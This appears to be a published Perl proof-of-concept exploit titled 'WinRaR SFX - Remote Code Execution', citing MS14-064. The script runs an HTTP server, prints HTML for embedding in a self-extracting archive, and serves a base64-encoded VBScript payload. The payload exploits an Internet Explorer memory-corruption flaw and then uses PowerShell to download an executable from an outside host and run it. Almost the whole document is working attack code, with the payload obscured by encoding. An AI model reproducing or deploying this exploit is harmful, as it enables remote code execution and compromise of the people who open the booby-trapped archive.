#!/usr/bin/perl
# Title : WinRaR SFX - Remote Code Execution
# Affected Versions: All Version
# Tested on Windows 7 / Server 2008
#
# Author: Mohammad Reza Espargham
# Linkedin: https://ir.linkedin.com/in/rezasp
# E-Mail: me[at]reza[dot]es , reza.espargham[at]gmail[dot]com
# Website: www.reza.es
# Twitter: https://twitter.com/rezesp
# FaceBook: https://www.facebook.com/reza.espargham
#
# ID: MS14-064

use strict;
use warnings;
use IO::Socket;
use MIME::Base64 qw( decode_base64 );
use Socket 'inet_ntoa';
use Sys::Hostname 'hostname';

print "    Mohammad Reza Espargham\n\n";
my $ip = inet_ntoa(scalar gethostbyname(hostname() || 'localhost'));

my $port = 80;

print "Winrar HTML Code\n".'<html><head><title>poc</title><META http-equiv="refresh" content="0;URL=http://&apos; . $ip . 
'"></head></html>'."\n\n" if($port==80);
print "Winrar HTML Code\n".'<html><head><title>poc</title><META http-equiv="refresh" content="0;URL=http://&apos; . $ip . 
':' . $port . '"></head></html>'."\n\n" if($port!=80);

my $server = new IO::Socket::INET(  Proto => 'tcp',
LocalPort => $port,
Listen => SOMAXCONN,
ReuseAddr => 1)
or die "Unable to create server socket";

# Server loop
while(my $client = $server->accept())
{
    my $client_info;
    while(<$client>)
    {
        last if /^\r\n$/;
        $client_info .= $_;
    }
    incoming($client, $client_info);
}

sub incoming
{
    print "\n=== Incoming Request:\n";
    my $client = shift;
    print $client &buildResponse($client, shift);
    close($client);
}

sub buildResponse
{
    my $client = shift;
    my $client_info = shift;
    
    my $poc="CjxodG1sPgo8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPUVt
    dWxhdGVJRTgiID4KPGhlYWQ+CjwvaGVhZD4KPGJvZHk+CiAKPFNDUklQVCBMQU5HVUFHRT0iVkJT
    Y3JpcHQiPgoKZnVuY3Rpb24gcnVubXVtYWEoKSAKT24gRXJyb3IgUmVzdW1lIE5leHQKc2V0IHNo
    ZWxsPWNyZWF0ZW9iamVjdCgiU2hlbGwuQXBwbGljYXRpb24iKQpjb21tYW5kPSJJbnZva2UtRXhw
    cmVzc2lvbiAkKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgn
    aHR0cDovL3RoZS5lYXJ0aC5saS9+c2d0YXRoYW0vcHV0dHkvbGF0ZXN0L3g4Ni9wdXR0eS5leGUn
    LCdsb2FkLmV4ZScpOyQoTmV3LU9iamVjdCAtY29tIFNoZWxsLkFwcGxpY2F0aW9uKS5TaGVsbEV4
    ZWN1dGUoJ2xvYWQuZXhlJyk7IgpzaGVsbC5TaGVsbEV4ZWN1dGUgInBvd2Vyc2hlbGwuZXhlIiwg
    Ii1Db21tYW5kICIgJiBjb21tYW5kLCAiIiwgInJ1bmFzIiwgMAplbmQgZnVuY3Rpb24KPC9zY3Jp
    cHQ+CiAKPFNDUklQVCBMQU5HVUFHRT0iVkJTY3JpcHQiPgogIApkaW0gICBhYSgpCmRpbSAgIGFi
    KCkKZGltICAgYTAKZGltICAgYTEKZGltICAgYTIKZGltICAgYTMKZGltICAgd2luOXgKZGltICAg
    aW50VmVyc2lvbgpkaW0gICBybmRhCmRpbSAgIGZ1bmNsYXNzCmRpbSAgIG15YXJyYXkKIApCZWdp
    bigpCiAKZnVuY3Rpb24gQmVnaW4oKQogIE9uIEVycm9yIFJlc3VtZSBOZXh0CiAgaW5mbz1OYXZp
    Z2F0b3IuVXNlckFnZW50CiAKICBpZihpbnN0cihpbmZvLCJXaW42NCIpPjApICAgdGhlbgogICAg
    IGV4aXQgICBmdW5jdGlvbgogIGVuZCBpZgogCiAgaWYgKGluc3RyKGluZm8sIk1TSUUiKT4wKSAg
    IHRoZW4gCiAgICAgICAgICAgICBpbnRWZXJzaW9uID0gQ0ludChNaWQoaW5mbywgSW5TdHIoaW5m
    bywgIk1TSUUiKSArIDUsIDIpKSAgIAogIGVsc2UKICAgICBleGl0ICAgZnVuY3Rpb24gIAogICAg
    ICAgICAgICAgIAogIGVuZCBpZgogCiAgd2luOXg9MAogCiAgQmVnaW5Jbml0KCkKICBJZiBDcmVh
    dGUoKT1UcnVlIFRoZW4KICAgICBteWFycmF5PSAgICAgICAgY2hydygwMSkmY2hydygyMTc2KSZj
    aHJ3KDAxKSZjaHJ3KDAwKSZjaHJ3KDAwKSZjaHJ3KDAwKSZjaHJ3KDAwKSZjaHJ3KDAwKQogICAg
    IG15YXJyYXk9bXlhcnJheSZjaHJ3KDAwKSZjaHJ3KDMyNzY3KSZjaHJ3KDAwKSZjaHJ3KDApCiAK
    ICAgICBpZihpbnRWZXJzaW9uPDQpIHRoZW4KICAgICAgICAgZG9jdW1lbnQud3JpdGUoIjxicj4g
    SUUiKQogICAgICAgICBkb2N1bWVudC53cml0ZShpbnRWZXJzaW9uKQogICAgICAgICBydW5zaGVs
    bGNvZGUoKSAgICAgICAgICAgICAgICAgICAgCiAgICAgZWxzZSAgCiAgICAgICAgICBzZXRub3Rz
    YWZlbW9kZSgpCiAgICAgZW5kIGlmCiAgZW5kIGlmCmVuZCBmdW5jdGlvbgogCmZ1bmN0aW9uIEJl
    Z2luSW5pdCgpCiAgIFJhbmRvbWl6ZSgpCiAgIHJlZGltIGFhKDUpCiAgIHJlZGltIGFiKDUpCiAg
    IGEwPTEzKzE3KnJuZCg2KQogICBhMz03KzMqcm5kKDUpCmVuZCBmdW5jdGlvbgogCmZ1bmN0aW9u
    IENyZWF0ZSgpCiAgT24gRXJyb3IgUmVzdW1lIE5leHQKICBkaW0gaQogIENyZWF0ZT1GYWxzZQog
    IEZvciBpID0gMCBUbyA0MDAKICAgIElmIE92ZXIoKT1UcnVlIFRoZW4KICAgICAgIENyZWF0ZT1U
    cnVlCiAgICAgICBFeGl0IEZvcgogICAgRW5kIElmIAogIE5leHQKZW5kIGZ1bmN0aW9uCiAKc3Vi
    IHRlc3RhYSgpCmVuZCBzdWIKIApmdW5jdGlvbiBteWRhdGEoKQogICAgT24gRXJyb3IgUmVzdW1l
    IE5leHQKICAgICBpPXRlc3RhYQogICAgIGk9bnVsbAogICAgIHJlZGltICBQcmVzZXJ2ZSBhYShh
    MikgIAogICAKICAgICBhYigwKT0wCiAgICAgYWEoYTEpPWkKICAgICBhYigwKT02LjM2NTk4NzM3
    NDM3ODAxRS0zMTQKIAogICAgIGFhKGExKzIpPW15YXJyYXkKICAgICBhYigyKT0xLjc0MDg4NTM0
    NzMxMzI0RS0zMTAgIAogICAgIG15ZGF0YT1hYShhMSkKICAgICByZWRpbSAgUHJlc2VydmUgYWEo
    YTApICAKZW5kIGZ1bmN0aW9uIAogCiAKZnVuY3Rpb24gc2V0bm90c2FmZW1vZGUoKQogICAgT24g
    RXJyb3IgUmVzdW1lIE5leHQKICAgIGk9bXlkYXRhKCkgIAogICAgaT1ydW0oaSs4KQogICAgaT1y
    dW0oaSsxNikKICAgIGo9cnVtKGkrJmgxMzQpICAKICAgIGZvciBrPTAgdG8gJmg2MCBzdGVwIDQK
    ICAgICAgICBqPXJ1bShpKyZoMTIwK2spCiAgICAgICAgaWYoaj0xNCkgdGhlbgogICAgICAgICAg
    ICAgIGo9MCAgICAgICAgICAKICAgICAgICAgICAgICByZWRpbSAgUHJlc2VydmUgYWEoYTIpICAg
    ICAgICAgICAgIAogICAgIGFhKGExKzIpKGkrJmgxMWMrayk9YWIoNCkKICAgICAgICAgICAgICBy
    ZWRpbSAgUHJlc2VydmUgYWEoYTApICAKIAogICAgIGo9MCAKICAgICAgICAgICAgICBqPXJ1bShp
    KyZoMTIwK2spICAgCiAgICAgICAgICAKICAgICAgICAgICAgICAgRXhpdCBmb3IKICAgICAgICAg
    ICBlbmQgaWYKIAogICAgbmV4dCAKICAgIGFiKDIpPTEuNjk3NTk2NjMzMTY3NDdFLTMxMwogICAg
    cnVubXVtYWEoKSAKZW5kIGZ1bmN0aW9uCiAKZnVuY3Rpb24gT3ZlcigpCiAgICBPbiBFcnJvciBS
    ZXN1bWUgTmV4dAogICAgZGltIHR5cGUxLHR5cGUyLHR5cGUzCiAgICBPdmVyPUZhbHNlCiAgICBh
    MD1hMCthMwogICAgYTE9YTArMgogICAgYTI9YTArJmg4MDAwMDAwCiAgIAogICAgcmVkaW0gIFBy
    ZXNlcnZlIGFhKGEwKSAKICAgIHJlZGltICAgYWIoYTApICAgICAKICAgCiAgICByZWRpbSAgUHJl
    c2VydmUgYWEoYTIpCiAgIAogICAgdHlwZTE9MQogICAgYWIoMCk9MS4xMjM0NTY3ODkwMTIzNDU2
    Nzg5MDEyMzQ1Njc4OTAKICAgIGFhKGEwKT0xMAogICAgICAgICAgIAogICAgSWYoSXNPYmplY3Qo
    YWEoYTEtMSkpID0gRmFsc2UpIFRoZW4KICAgICAgIGlmKGludFZlcnNpb248NCkgdGhlbgogICAg
    ICAgICAgIG1lbT1jaW50KGEwKzEpKjE2ICAgICAgICAgICAgIAogICAgICAgICAgIGo9dmFydHlw
    ZShhYShhMS0xKSkKICAgICAgICAgICBpZigoaj1tZW0rNCkgb3IgKGoqOD1tZW0rOCkpIHRoZW4K
    ICAgICAgICAgICAgICBpZih2YXJ0eXBlKGFhKGExLTEpKTw+MCkgIFRoZW4gICAgCiAgICAgICAg
    ICAgICAgICAgSWYoSXNPYmplY3QoYWEoYTEpKSA9IEZhbHNlICkgVGhlbiAgICAgICAgICAgICAK
    ICAgICAgICAgICAgICAgICAgIHR5cGUxPVZhclR5cGUoYWEoYTEpKQogICAgICAgICAgICAgICAg
    IGVuZCBpZiAgICAgICAgICAgICAgIAogICAgICAgICAgICAgIGVuZCBpZgogICAgICAgICAgIGVs
    c2UKICAgICAgICAgICAgIHJlZGltICBQcmVzZXJ2ZSBhYShhMCkKICAgICAgICAgICAgIGV4aXQg
    IGZ1bmN0aW9uCiAKICAgICAgICAgICBlbmQgaWYgCiAgICAgICAgZWxzZQogICAgICAgICAgIGlm
    KHZhcnR5cGUoYWEoYTEtMSkpPD4wKSAgVGhlbiAgICAKICAgICAgICAgICAgICBJZihJc09iamVj
    dChhYShhMSkpID0gRmFsc2UgKSBUaGVuCiAgICAgICAgICAgICAgICAgIHR5cGUxPVZhclR5cGUo
    YWEoYTEpKQogICAgICAgICAgICAgIGVuZCBpZiAgICAgICAgICAgICAgIAogICAgICAgICAgICBl
    bmQgaWYKICAgICAgICBlbmQgaWYKICAgIGVuZCBpZgogICAgICAgICAgICAgICAKICAgICAKICAg
    IElmKHR5cGUxPSZoMmY2NikgVGhlbiAgICAgICAgIAogICAgICAgICAgT3Zlcj1UcnVlICAgICAg
    CiAgICBFbmQgSWYgIAogICAgSWYodHlwZTE9JmhCOUFEKSBUaGVuCiAgICAgICAgICBPdmVyPVRy
    dWUKICAgICAgICAgIHdpbjl4PTEKICAgIEVuZCBJZiAgCiAKICAgIHJlZGltICBQcmVzZXJ2ZSBh
    YShhMCkgICAgICAgICAgCiAgICAgICAgIAplbmQgZnVuY3Rpb24KIApmdW5jdGlvbiBydW0oYWRk
    KSAKICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0CiAgICByZWRpbSAgUHJlc2VydmUgYWEoYTIpICAK
    ICAgCiAgICBhYigwKT0wICAgCiAgICBhYShhMSk9YWRkKzQgICAgIAogICAgYWIoMCk9MS42OTc1
    OTY2MzMxNjc0N0UtMzEzICAgICAgIAogICAgcnVtPWxlbmIoYWEoYTEpKSAgCiAgICAKICAgIGFi
    KDApPTAKICAgIHJlZGltICBQcmVzZXJ2ZSBhYShhMCkKZW5kIGZ1bmN0aW9uCiAKPC9zY3JpcHQ+
    CiAKPC9ib2R5Pgo8L2h0bWw+";
    $poc = decode_base64($poc);
    
    my $r = "HTTP/1.0 200 OK\r\nContent-type: text/html\r\n\r\n
    $poc";
    return $r;
}

